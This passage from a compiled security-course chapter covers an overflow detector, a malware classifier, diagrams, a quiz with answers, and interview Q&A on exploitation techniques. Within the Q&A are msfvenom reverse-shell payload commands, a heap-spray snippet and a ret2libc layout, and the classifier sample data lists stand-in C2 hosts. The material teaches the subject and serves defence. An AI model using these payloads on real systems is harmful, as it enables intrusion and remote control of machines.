— likely denial of service or controlled crash'\n        : 'Local variable corruption — potential information disclosure',\n      recommendation: overflowBytes > 16\n        ? 'Replace unsafe functions (strcpy → strncpy, gets → fgets), enable stack canaries (-fstack-protector), and enforce bounds checking'\n        : `Increase buffer size to at least ${frame.inputSize + 8} bytes and validate all input lengths`,\n    };\n  }\n\n  detectHeapOverflow(region: MemoryRegion, writtenBytes: number): OverflowVulnerability | null {\n    if (writtenBytes <= region.size) return null;\n    return {\n      functionName: `heap_chunk_${region.address}`,\n      type: 'heap_overflow',\n      severity: 'high',\n      description: `Heap overflow: ${writtenBytes}B written into ${region.size}B chunk at ${region.address}`,\n      overwrittenRegions: ['Adjacent heap chunk metadata', 'Adjacent heap user data'],\n      exploitability: 'Heap metadata corruption may yield arbitrary-write primitive for further exploitation',\n      recommendation: 'Use safe allocators (glibc malloc hardening), enable guard pages, and run AddressSanitizer during testing',\n    };\n  }\n\n  analyzeStackFrames(frames: StackFrame[]): OverflowVulnerability[] {\n    const vulnerabilities: OverflowVulnerability[] = [];\n    for (const frame of frames) {\n      const stackVuln = this.detectStackOverflow(frame);\n      if (stackVuln) vulnerabilities.push(stackVuln);\n      for (const region of frame.locals) {\n        const heapVuln = this.detectHeapOverflow(region, frame.inputSize);\n        if (heapVuln) vulnerabilities.push(heapVuln);\n      }\n    }\n    return vulnerabilities;\n  }\n}\n\n// Example: a vulnerable function copying user input into a small stack buffer\nconst detector = new OverflowDetector();\nconst vulnerableFrame: StackFrame = {\n  functionName: 'process_packet',\n  bufferSize: 64,\n  bufferAddress: '0xbffffa00',\n  returnAddress: '0xbffffa44',\n  savedEbp: '0xbffffa40',\n  inputSize: 200,\n  locals: [\n    { address: '0xbffffa00', size: 64, permissions: 'rw-', data: 'A'.repeat(128) },\n    { address: '0xbffffa30', size: 4, permissions: 'rw-', data: '' },\n  ],\n};\n\nconst findings = detector.analyzeStackFrames([vulnerableFrame]);\nconsole.log(JSON.stringify(findings, null, 2));\n// Expected: critical severity — return address overwritten → EIP control\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "2-malware-behavior-classifier",
      children: "2. Malware Behavior Classifier"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This classifier analyzes malware samples by inspecting API call patterns, file operations, registry modifications, and network connections to determine the malware family and map behaviors to the MITRE ATT&CK framework."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "interface MalwareSample {\n  apiCalls: string[];\n  registryKeys: string[];\n  fileOperations: string[];\n  networkConnections: string[];\n}\n\ninterface ClassificationResult {\n  family: string;\n  confidence: number;\n  behaviors: string[];\n  mitreMapping: string[];\n}\n\nclass MalwareClassifier {\n  // API signatures for known malware families\n  private readonly ransomwareApis = [\n    'CryptEncrypt', 'CryptDecrypt', 'EncryptFile', 'DecryptFile',\n    'WriteFile', 'MoveFileEx', 'DeleteFile', 'FindFirstFile',\n    'FindNextFile', 'SetFileAttributesW',\n  ];\n\n  private readonly keyloggerApis = [\n    'SetWindowsHookEx', 'GetAsyncKeyState', 'GetForegroundWindow',\n    'GetWindowTextA', 'GetKeyboardState', 'MapVirtualKey',\n    'GetClipboardData', 'SetClipboardData',\n  ];\n\n  private readonly persistenceApis = [\n    'RegSetValueEx', 'CreateServiceW', 'SchTasksRegister',\n    'CreateProcess', 'CopyFile', 'SHGetSpecialFolderPath',\n  ];\n\n  private readonly evasionApis = [\n    'IsDebuggerPresent', 'CheckRemoteDebuggerPresent',\n    'NtQueryInformationProcess', 'GetModuleHandle', 'GetProcAddress',\n    'VirtualProtect', 'NtSetInformationThread',\n  ];\n\n  classify(sample: MalwareSample): ClassificationResult {\n    const behaviors: string[] = [];\n    const mitreMapping: string[] = [];\n    const apiSet = new Set(sample.apiCalls.map(a => a.split('!').pop() || a));\n    let confidence = 0;\n    let family = 'Unknown';\n\n    // --- Ransomware detection ---\n    const cryptoApis = this.ransomwareApis.filter(a => apiSet.has(a));\n    const encryptedFiles = sample.fileOperations.filter(\n      f => /\\.(encrypted|locked|crypt|enc)$/i.test(f)\n    );\n    if (cryptoApis.length >= 3 && encryptedFiles.length > 5) {\n      behaviors.push('Mass file encryption using crypto APIs');\n      behaviors.push('File extension modification (ransom note pattern)');\n      mitreMapping.push('T1486 — Data Encrypted for Impact');\n      mitreMapping.push('T1491 — Defacement (ransom note)');\n      confidence += 0.5;\n      family = 'Ransomware';\n    }\n\n    // --- Keylogger detection ---\n    const hookApis = this.keyloggerApis.filter(a => apiSet.has(a));\n    if (hookApis.length >= 3) {\n      behaviors.push('Global keyboard hook installed');\n      behaviors.push('Keystroke capture via GetAsyncKeyState polling');\n      mitreMapping.push('T1056.001 — Input Capture: Keylogging');\n      confidence += 0.35;\n      if (family === 'Unknown') family = 'Keylogger / Spyware';\n    }\n\n    // --- Persistence detection ---\n    const persistCalls = this.persistenceApis.filter(a => apiSet.has(a));\n    if (persistCalls.length >= 2) {\n      behaviors.push('Persistence via registry Run key or scheduled task');\n      mitreMapping.push('T1547.001 — Boot/Logon Autostart: Registry Run Keys');\n      mitreMapping.push('T1053.005 — Scheduled Task/Job');\n      confidence += 0.2;\n    }\n\n    // --- Anti-analysis / evasion ---\n    const antiDbg = this.evasionApis.filter(a => apiSet.has(a));\n    if (antiDbg.length >= 2) {\n      behaviors.push('Anti-debugging / sandbox evasion routines');\n      mitreMapping.push('T1622 — Debugger Evasion');\n      mitreMapping.push('T1497 — Virtualization/Sandbox Evasion');\n      confidence += 0.15;\n    }\n\n    // --- C2 beaconing ---\n    if (sample.networkConnections.length > 3) {\n      const domains = new Set(sample.networkConnections.map(c => c.split(':')[0]));\n      if (domains.size > 2) {\n        behaviors.push('Multiple outbound connections — possible C2 beaconing');\n        mitreMapping.push('T1071.001 — Application Layer Protocol: Web Protocols');\n        confidence += 0.1;\n      }\n    }\n\n    // --- Credential theft ---\n    if (sample.fileOperations.some(f => /SAM|SYSTEM|NTDS/i.test(f))) {\n      behaviors.push('Credential dumping (SAM/NTDS access)');\n      mitreMapping.push('T1003.002 — OS Credential Dumping: SAM');\n      confidence += 0.25;\n      family = 'InfoStealer / Credential Dumper';\n    }\n\n    return {\n      family,\n      confidence: Math.min(confidence, 1.0),\n      behaviors: [...new Set(behaviors)],\n      mitreMapping: [...new Set(mitreMapping)],\n    };\n  }\n}\n\n// Example: classify a ransomware sample\nconst classifier = new MalwareClassifier();\nconst sample: MalwareSample = {\n  apiCalls: [\n    'kernel32!FindFirstFile', 'kernel32!FindNextFile',\n    'kernel32!WriteFile', 'kernel32!MoveFileEx',\n    'advapi32!CryptEncrypt', 'advapi32!CryptDecrypt',\n    'kernel32!DeleteFile', 'advapi32!RegSetValueEx',\n  ],\n  registryKeys: [\n    'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\svchost',\n  ],\n  fileOperations: [\n    'C:\\\\Users\\\\victim\\\\docs\\\\report.docx.encrypted',\n    'C:\\\\Users\\\\victim\\\\docs\\\\photo.jpg.encrypted',\n    'C:\\\\Users\\\\victim\\\\docs\\\\invoice.pdf.encrypted',\n    'C:\\\\Users\\\\victim\\\\docs\\\\budget.xlsx.encrypted',\n    'C:\\\\Users\\\\victim\\\\docs\\\\backup.zip.encrypted',\n    'C:\\\\Users\\\\victim\\\\docs\\\\notes.txt.encrypted',\n  ],\n  networkConnections: [\n    'evil-c2.com:8080',\n    '192.168.1.100:4443',\n    'malware-panel.net:443',\n  ],\n};\n\nconst result = classifier.classify(sample);\nconsole.log(`Family: ${result.family}`);\nconsole.log(`Confidence: ${(result.confidence * 100).toFixed(0)}%`);\nconsole.log('Behaviors:', result.behaviors.join(' | '));\nconsole.log('MITRE ATT&CK:', result.mitreMapping.join(' | '));\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "mermaid-diagrams",
      children: "Mermaid Diagrams"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "1-buffer-overflow-attack-process",
      children: "1. Buffer Overflow Attack Process"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This flowchart illustrates the step-by-step process of a classic stack-based buffer overflow attack: crafting input that overflows a local buffer, overwriting the saved return address, and redirecting execution to attacker-controlled shellcode."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart LR\n    subgraph Step1[\"1️⃣ Craft Malicious Input\"]\n        A[Attacker prepares payload:\\nshellcode + padding + new return address]\n        B[Payload exceeds target buffer size]\n    end\n\n    subgraph Step2[\"2️⃣ Stack Corruption\"]\n        C[Buffer allocated on stack\\nwith fixed capacity]\n        D[Overflow writes past buffer boundary]\n        E[Saved EBP overwritten]\n        F[Return address overwritten\\n→ now points to shellcode]\n    end\n\n    subgraph Step3[\"3️⃣ Control Flow Hijack\"]\n        G[Function executes RET instruction]\n        H[EIP loaded with overwritten\\nreturn address → shellcode]\n        I[Shellcode executes\\n→ attacker gains interactive shell]\n    end\n\n    Step1 --> Step2\n    Step2 --> Step3\n    A --> B\n    B --> C\n    C --> D\n    D --> E\n    E --> F\n    F --> G\n    G --> H\n    H --> I\n\n    style Step1 fill:#fff3e0,stroke:#ff9800\n    style Step2 fill:#fce4ec,stroke:#f44336\n    style Step3 fill:#ffebee,stroke:#d32f2f\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "2-secure-software-development-lifecycle-ssdlc",
      children: "2. Secure Software Development Lifecycle (SSDLC)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The SSDLC integrates security gates at every phase of development. This diagram maps security activities (threat modeling, SAST, DAST, fuzzing, pen testing) to each SDLC phase, with feedback loops ensuring continuous improvement."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart LR\n    subgraph Req[\"📋 Requirements\"]\n        R1[Security Requirements]\n        R2[Threat Modeling<br/>STRIDE / DREAD]\n        R3[Risk Assessment]\n        R4[Security Acceptance<br/>Criteria]\n    end\n\n    subgraph Des[\"🎨 Design\"]\n        D1[Secure Architecture<br/>Review]\n        D2[Attack Surface<br/>Analysis]\n        D3[Data Flow Diagrams<br/>+ Trust Boundaries]\n        D4[Privacy Impact<br/>Assessment]\n    end\n\n    subgraph Impl[\"💻 Implementation\"]\n        I1[Secure Coding<br/>Standards]\n        I2[SAST Scanning<br/>Flawfinder / Semgrep]\n        I3[Peer Code Review<br/>+ Security Checklist]\n        I4[Dependency Scanning<br/>OWASP Dependency-Check]\n    end\n\n    subgraph Test[\"🧪 Testing\"]\n        T1[DAST / Dynamic<br/>Scanning]\n        T2[Fuzz Testing<br/>AFL / libFuzzer]\n        T3[Penetration Test]\n        T4[Vulnerability<br/>Scanning]\n    end\n\n    subgraph Dep[\"🚀 Deployment\"]\n        Dep1[Hardened<br/>Configuration]\n        Dep2[Secrets Management<br/>Vault / KMS]\n        Dep3[Immutable<br/>Infrastructure]\n        Dep4[Security Gateway<br/>Review]\n    end\n\n    subgraph Mnt[\"🔧 Maintenance\"]\n        M1[Patch Management<br/>+ CVE Tracking]\n        M2[Vulnerability<br/>Monitoring]\n        M3[Incident Response<br/>Plan + Tabletop]\n        M4[Periodic Security<br/>Audits]\n    end\n\n    Req --> Des --> Impl --> Test --> Dep --> Mnt\n    Mnt -.->|Continuous Feedback| Req\n\n    style Req fill:#e3f2fd,stroke:#1565c0\n    style Des fill:#e8f5e9,stroke:#2e7d32\n    style Impl fill:#fff3e0,stroke:#ef6c00\n    style Test fill:#fce4ec,stroke:#c62828\n    style Dep fill:#f3e5f5,stroke:#6a1b9a\n    style Mnt fill:#e0f2f1,stroke:#00695c\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-quiz",
      children: "Chapter Quiz"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Question"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "A"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "B"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "C"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "D"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Answer"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ASLR defeats buffer overflow exploitation by:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypting all memory regions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Randomizing memory address layouts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Preventing writes to the buffer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compiling with stack canaries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DEP/NX prevents execution of code on:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The stack only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Marked non-executable memory pages"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The text segment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel memory only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A ROP chain is used to:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Increase buffer size"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Chain existing code gadgets to execute arbitrary behavior"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypt shellcode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disable ASLR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The Morris Worm primarily spread via:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Email attachments"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB drives"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "fingerd buffer overflow and sendmail DEBUG"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "JavaScript malware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NotPetya's initial infection vector was:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A phishing email"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compromised ME Doc accounting software update"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB drive"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQL injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "The SolarWinds SUNBURST backdoor communicated via:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Raw TCP sockets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HTTP disguised as Orion Improvement Program telemetry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS tunneling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ICMP covert channel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stuxnet used how many zero-day exploits?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which SSDLC phase uses threat modeling (STRIDE)?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requirements"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Design"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Implementation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A stack canary protects against:"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack buffer overflow detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SQL injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Format string attacks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Heap overflow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which tool performs static analysis on C/C++ code?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AFL"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Flawfinder"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process Monitor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Metasploit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "B"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.em, {
        children: "End of Chapter 4 → System & Software Security"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-interview-corner-q13q20",
      children: "Extended Interview Corner (Q13–Q20)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q13-explain-heap-spraying-as-an-exploitation-technique",
      children: "Q13: Explain heap spraying as an exploitation technique."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Heap spraying places many copies of shellcode (or NOP sled + shellcode) across the heap by making many allocations containing the payload. When an attacker controls an indirect call through a corrupted heap pointer or virtual function table, any of these sprayed addresses is likely to land in shellcode."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Instead of threading a needle (precise return address overwrite), you fill the room with needles pointing in every direction, then throw a dart (indirect call). The dart will hit a needle somewhere."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// JavaScript heap spray example (browser exploit)\n// Allocate hundreds of heap blocks filled with NOP sled + shellcode\nvar shellcode = unescape(\"%u90%u90%u90%u90%u90%u90%u90%u90%u90%u90...\" + shellcode);\nvar nop_sled = \"%u9090%u9090%u9090%u9090\";\nwhile (spray.length < 500) {\n    spray.push(nop_sled + shellcode);  // allocate sprayed blocks\n}\n// Now trigger a heap corruption that dereferences a\n// heap pointer → it will likely land in one of the sprayed blocks\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Defense:"
      }), " ASLR randomizes heap base; heap isolation separates different types of objects."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q14-what-is-the-difference-between-staged-and-stageless-shellcode",
      children: "Q14: What is the difference between staged and stageless shellcode?"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Stageless"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Staged"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Single payload"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Contains the full executable code in one shot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Small first-stage downloads larger second-stage"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Size"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Large (200–800 bytes)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Small (100–300 bytes for stage 1)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Reliability"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Self-contained, no network needed post-exploit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires network connectivity for stage retrieval"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Detection"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Larger static signature"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stage 1 is small/hard to detect; stage 2 is not in memory initially"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Use case"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stable exploits, no outbound allowed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited buffer space, need flexibility"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "msfvenom examples:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Stageless: full reverse shell in one payload\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c\n\n# Staged: small stager downloads meterpreter\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f c\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q15-how-does-aslr-differ-between-32-bit-and-64-bit-linux",
      children: "Q15: How does ASLR differ between 32-bit and 64-bit Linux?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " The entropy available for randomization differs substantially:"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Component"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "32-bit Entropy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "64-bit Entropy"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Stack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "19 bits (19–24 bits on older kernels)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "22 bits (11 bits on older kernels)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "mmap (shared libraries)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8 bits (256 positions) + 16 bits possible"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "28 bits (on x86_64, 256TB user space)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Heap"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "13 bits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "13 bits + 30 bits"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Practical impact:"
      }), " On 32-bit, brute-forcing ASLR for libc is feasible (~2^8 = 256 attempts worst case). On 64-bit, direct brute-force is infeasible (~2^28 attempts)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q16-what-is-sehop-and-how-does-safeseh-differ",
      children: "Q16: What is SEHOP and how does SafeSEH differ?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "SEHOP"
      }), " (Structured Exception Handler Overwrite Protection) validates the integrity of the entire SEH chain before dispatching an exception. It walks the linked list of EXCEPTION_REGISTRATION_RECORD structures and verifies:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["The chain ends with the final handler (", (0,jsx_runtime.jsx)(_components.code, {
          children: "ntdll!FinalHandler"
        }), ")"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "No record points to the stack or heap (common overflow targets)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "All records are within valid module address ranges"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "SafeSEH"
      }), " is a compile-time option that builds a table of valid exception handler addresses for each module. At exception dispatch, the OS verifies the handler address is in this table."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Difference:"
      }), " SafeSEH checks individual handler validity; SEHOP checks chain integrity. Both are needed for robust protection."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q17-explain-return-to-libc-and-when-you-would-use-it-over-a-full-rop-chain",
      children: "Q17: Explain return-to-libc and when you would use it over a full ROP chain."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " Return-to-libc (ret2libc) redirects execution to a single libc function → typically ", (0,jsx_runtime.jsx)(_components.code, {
        children: "system(\"/bin/sh\")"
      }), ". The stack layout is:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "[ padding ][ &system() ][ fake_ret_addr ][ &\"/bin/sh\" ]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Use ret2libc when:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You have very limited overflow space (cannot fit a full ROP chain)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You only need to call one function"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "ASLR is off or known (or you've leaked libc base)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Use full ROP when:"
